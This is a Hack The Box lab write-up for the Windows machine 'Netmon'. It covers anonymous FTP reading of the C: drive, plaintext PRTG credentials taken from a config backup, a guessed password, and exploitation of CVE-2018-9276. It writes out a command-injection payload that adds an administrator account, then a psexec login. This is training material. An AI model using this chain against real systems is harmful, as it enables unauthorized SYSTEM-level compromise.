---
title: HTB — Netmon
type: lab-writeup
platform: HTB
difficulty: foundational
os: Windows
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - HTB
  - windows
  - prtg
  - ftp
  - anonymous
  - default-creds
  - rce
  - monitoring
---

# HTB — Netmon

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Netmon |
| Difficulty | Easy |
| OS | Windows Server 2016 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-27 |

> **Summary:** Anonymous FTP access to the entire C: drive allows reading the user flag directly and extracting old PRTG config backups with plaintext credentials. Modified creds grant admin access to PRTG Network Monitor, where a known notification RCE vulnerability yields SYSTEM.

---

## Objectives

- [ ] Recon: discover anonymous FTP with full filesystem access
- [ ] Extract PRTG configuration backup with credentials
- [ ] Exploit: RCE via PRTG notification feature
- [ ] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/netmon_initial <MACHINE_IP>
```

**Key open ports:**

| Port | Service | Notes |
|---|---|---|
| 21/tcp | ftp | Microsoft ftpd — Anonymous login allowed |
| 80/tcp | http | Indy httpd 18.1 — PRTG Network Monitor |
| 135/tcp | msrpc | Microsoft RPC |
| 445/tcp | microsoft-ds | SMB |

### FTP enumeration

```bash
ftp <MACHINE_IP>
# Login: anonymous / (blank)
```

Anonymous FTP provides access to the entire `C:\` drive. User flag is directly accessible:

```
ftp> cd Users\Public
ftp> get user.txt
```

### PRTG config extraction

PRTG stores configuration in `C:\ProgramData\Paessler\PRTG Network Monitor\`:

```
ftp> cd "ProgramData/Paessler/PRTG Network Monitor"
ftp> get "PRTG Configuration.old.bak"
```

Search the backup file for credentials:

```bash
grep -i "dbpassword" "PRTG Configuration.old.bak"
```

Found: `prtgadmin` / `PrTg@dmin2018`

> **Key insight:** The backup is from 2018. The current year on the box is 2019. Try incrementing the year: `PrTg@dmin2019` — this works.

---

## Vulnerability Background

**PRTG Network Monitor — Authenticated RCE via Notifications**

| Field | Detail |
|---|---|
| CVE | CVE-2018-9276 |
| Affected | PRTG Network Monitor < 18.2.39 |
| Type | OS command injection in notification parameters |
| Prerequisite | Admin credentials to PRTG web interface |
| Impact | Commands execute as SYSTEM (PRTG runs as SYSTEM service) |

---

## Foothold + Privilege Escalation

PRTG runs as SYSTEM, so exploitation yields root immediately.

### RCE via notification

1. Log in to PRTG at `http://<IP>` with `prtgadmin` / `PrTg@dmin2019`
2. Navigate to Setup → Account Settings → Notifications
3. Create new notification → "Execute Program" → Demo exe notification
4. In the parameter field, inject a command:

```
test.txt;net user pwned Password123! /add;net localgroup administrators pwned /add
```

5. Save and trigger the notification (click the bell icon to test)
6. Connect via:

```bash
# Using psexec or evil-winrm with new admin user
psexec.py pwned:'Password123!'@<MACHINE_IP>
```

**Result:** SYSTEM shell (or admin shell, then grab root flag from `C:\Users\Administrator\Desktop\root.txt`)

---

## Flags

| Flag | Location |
|---|---|
| User | `C:\Users\Public\user.txt` (via anonymous FTP) |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- Anonymous FTP with filesystem access is an immediate critical finding — grab everything useful before moving on
- Configuration backups often contain credentials — always check `.old`, `.bak`, `.backup` files
- Password reuse with predictable patterns (incrementing year) is extremely common in real environments
- PRTG, Nagios, Zabbix, and other monitoring tools often run as SYSTEM — authenticated RCE = instant domain compromise
- Network monitoring tools are high-value targets for attackers — they have broad network access and elevated privileges

---

## Tools Used

- Nmap
- FTP client
- Impacket (psexec.py)
- Evil-WinRM

---

## References

- [Hack The Box — Netmon](https://app.hackthebox.com/machines/Netmon)
- [NVD CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Web-Application-Testing
- Nmap
- Common-Ports
- Impacket
- Evil-WinRM

---
<- [[Labs-MOC]]